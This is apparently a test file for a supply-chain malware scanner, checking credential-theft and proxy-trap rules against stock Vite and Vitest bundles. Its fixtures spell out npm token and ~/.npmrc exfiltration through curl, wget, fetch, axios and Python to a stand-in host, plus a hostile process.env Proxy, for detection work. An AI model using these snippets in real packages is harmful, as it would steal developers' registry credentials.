import { describe, expect, it } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { isPatternApplicableToFile } from "../pattern-applicability.js";
import {
  CAMPAIGN_PATTERNS_V2,
  INFOSTEALER_PATTERNS,
  OBFUSCATION_PATTERNS_V2,
  matchPatternInContent,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";
import { scan } from "../scanner.js";

const shaiHulud = CAMPAIGN_PATTERNS_V2.find(
  (pattern) => pattern.rule === "SHAI_HULUD_CRED_STEAL",
)!;
const proxyTrap = OBFUSCATION_PATTERNS_V2.find(
  (pattern) => pattern.rule === "PROXY_HANDLER_TRAP",
)!;
const proxyBackconnect = INFOSTEALER_PATTERNS.find(
  (pattern) => pattern.rule === "PROXY_BACKCONNECT",
)!;

function hits(
  pattern: PatternEntry,
  content: string,
  relativePath: string,
) {
  if (!isPatternApplicableToFile(pattern, content, relativePath)) return [];
  return matchPatternInContent(pattern, content);
}

function installedArtifact(...segments: string[]): string {
  return fs.readFileSync(path.join(process.cwd(), "node_modules", ...segments), "utf8");
}

function vitestEnvProxyChunk(): { content: string; relativePath: string } {
  const directory = path.join(process.cwd(), "node_modules", "vitest", "dist", "chunks");
  for (const name of fs.readdirSync(directory)) {
    if (!name.endsWith(".js")) continue;
    const content = fs.readFileSync(path.join(directory, name), "utf8");
    if (content.includes("new Proxy(env, {") && content.includes("process.env[key]")) {
      return { content, relativePath: `vitest/dist/chunks/${name}` };
    }
  }
  throw new Error("The installed Vitest package no longer contains the pinned env Proxy fixture");
}

describe("stock bundled-package false-positive regressions", () => {
  it("does not flag either Vitest 4.1.10 import.meta.env Proxy", () => {
    const moduleEvaluator = installedArtifact(
      "vitest",
      "dist",
      "module-evaluator.js",
    );
    const chunk = vitestEnvProxyChunk();

    expect(hits(proxyTrap, moduleEvaluator, "vitest/dist/module-evaluator.js")).toEqual([]);
    expect(hits(proxyTrap, chunk.content, chunk.relativePath)).toEqual([]);
  });

  it("does not call Vite 8.1.4's .npmrc deny-list or declaration credential theft", () => {
    const bundle = installedArtifact("vite", "dist", "node", "chunks", "node.js");
    const declarations = installedArtifact("vite", "dist", "node", "index.d.ts");

    expect(hits(shaiHulud, bundle, "vite/dist/node/chunks/node.js")).toEqual([]);
    expect(hits(shaiHulud, declarations, "vite/dist/node/index.d.ts")).toEqual([]);
  });

  it("keeps executable npm credential exfiltration and hostile Proxy traps positive", () => {
    const credentialTheft = `const creds = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
require("axios").post("https://collect.invalid/npm", { token: creds });`;
    const hostileProxy = `new Proxy(process.env, {
  get(_, key) {
    const value = process.env[key];
    fetch("https://collect.invalid/env", { method: "POST", body: value });
    return value;
  },
});`;

    expect(hits(shaiHulud, credentialTheft, "package/dist/steal.js").length).toBeGreaterThan(0);
    expect(hits(proxyTrap, hostileProxy, "package/dist/proxy.js").length).toBeGreaterThan(0);
  });

  it.each([
    [
      "standalone request",
      `const token = process.env.NPM_TOKEN;
request("https://collect.invalid/n", { body: token });`,
      "package/request.js",
    ],
    [
      "Python urllib",
      `token = os.getenv("NPM_TOKEN")
urllib.request.urlopen("https://collect.invalid/n", data=token)`,
      "package/uploader.py",
    ],
    [
      "shell curl",
      `token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      "package/publish.sh",
    ],
    [
      "shell wget",
      `creds=$(cat ~/.npmrc)
wget --post-data="$creds" https://collect.invalid/n`,
      "package/publish.bash",
    ],
    [
      "pathlib joinpath",
      `creds = Path.home().joinpath(".npmrc").read_text()
requests.post("https://collect.invalid/n", data=creds)`,
      "package/uploader.py",
    ],
    [
      "shell npmrc pipeline",
      `cat ~/.npmrc | curl --data-binary @- https://collect.invalid/n`,
      "package/publish.sh",
    ],
    [
      "uppercase npmrc path",
      `const creds = readFileSync("/home/user/.NPMRC");
fetch("https://collect.invalid/n", { body: creds });`,
      "package/uploader.js",
    ],
  ])("keeps %s credential flow applicable through the complete PatternEntry", (_name, source, file) => {
    expect(hits(shaiHulud, source, file).length).toBeGreaterThan(0);
  });

  it.each([
    [
      "comma declarator",
      `const clean = "public", token = process.env.NPM_TOKEN;
fetch("/ordinary", { body: clean });`,
      "package/bundle.js",
    ],
    [
      "parameter shadow",
      `const token = process.env.NPM_TOKEN;
function local(token) { fetch("/ordinary", { body: token }); }`,
      "package/bundle.js",
    ],
    [
      "generic get",
      `const token = process.env.NPM_TOKEN;
cache.get(token);`,
      "package/bundle.js",
    ],
    [
      "generic send",
      `const token = process.env.NPM_TOKEN;
client.send(token);`,
      "package/bundle.js",
    ],
    [
      "quoted shell command",
      `cmd="curl -d $NPM_TOKEN https://ordinary.invalid/n"`,
      "package/publish.sh",
    ],
    [
      "single-arrow parameter shadow",
      `const token = process.env.NPM_TOKEN;
const send = token => fetch("/ordinary", { body: token });`,
      "package/bundle.js",
    ],
    [
      "object-method parameter shadow",
      `const token = process.env.NPM_TOKEN;
const worker = { send(token) { fetch("/ordinary", { body: token }); } };`,
      "package/bundle.js",
    ],
    [
      "Python def parameter shadow",
      `token = os.getenv("NPM_TOKEN")
def send(token):
    requests.post("https://ordinary.invalid/n", data=token)`,
      "package/uploader.py",
    ],
    [
      "local CommonJS post method",
      `const token = process.env.NPM_TOKEN;
require("./cache").post("/ordinary", token);`,
      "package/bundle.js",
    ],
  ])("rejects %s through the complete PatternEntry", (_name, source, file) => {
    expect(hits(shaiHulud, source, file)).toEqual([]);
  });

  it.each([
    [
      "transitive JavaScript alias",
      `const token = process.env.NPM_TOKEN;
const body = token;
fetch("/ordinary", { body });`,
      "package/alias.js",
    ],
    [
      "pathlib division",
      `creds = (Path.home() / ".npmrc").read_text()
requests.post("https://collect.invalid/n", data=creds)`,
      "package/uploader.py",
    ],
    [
      "shell command substitution",
      `result="$(curl -d "$NPM_TOKEN" https://collect.invalid/n)"`,
      "package/publish.sh",
    ],
  ])("keeps %s settled flow through the complete PatternEntry", (_name, source, file) => {
    expect(hits(shaiHulud, source, file).length).toBeGreaterThan(0);
  });

  it.each([
    [
      "qualified require",
      `const token = process.env.NPM_TOKEN;
loader.require("axios").post("/ordinary", token);`,
      "package/bundle.js",
    ],
    [
      "no-space Python comment",
      `x=1# token = os.getenv("NPM_TOKEN")
requests.post("https://ordinary.invalid/n", data=token)`,
      "package/uploader.py",
    ],
    [
      "output-only curl token",
      `curl -o "$NPM_TOKEN" https://ordinary.invalid/n`,
      "package/publish.sh",
    ],
    [
      "single-quoted shell token",
      `curl -d '$NPM_TOKEN' https://ordinary.invalid/n`,
      "package/publish.sh",
    ],
  ])("rejects %s through the settled complete PatternEntry", (_name, source, file) => {
    expect(hits(shaiHulud, source, file)).toEqual([]);
  });
  it("keeps remote proxy evidence after shell parameter expansion", () => {
    const source = "echo ${value#prefix} ${value##prefix} ${#value} socks5://198.51.100.7:1080";
    expect(hits(proxyBackconnect, source, "package/publish.sh").length).toBeGreaterThan(0);
  });
  it("routes JS, Python, and shell flows through the production scanner", async () => {
    const directory = fs.mkdtempSync(path.join(os.tmpdir(), "scg-shai-flow-"));
    try {
      fs.writeFileSync(
        path.join(directory, "request.js"),
        `const token = process.env.NPM_TOKEN;
request("https://collect.invalid/n", { body: token });`,
      );
      fs.writeFileSync(
        path.join(directory, "urllib.py"),
        `token = os.getenv("NPM_TOKEN")
urllib.request.urlopen("https://collect.invalid/n", data=token)`,
      );
      fs.writeFileSync(
        path.join(directory, "publish.sh"),
        `token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      );

      const report = await scan({
        target: directory,
        format: "text",
        noHistory: true,
      });
      for (const file of ["request.js", "urllib.py", "publish.sh"]) {
        expect(
          report.findings.some(
            (finding) =>
              finding.file === file && finding.rule === "SHAI_HULUD_CRED_STEAL",
          ),
          file,
        ).toBe(true);
      }
    } finally {
      fs.rmSync(directory, { recursive: true, force: true });
    }
  });
});
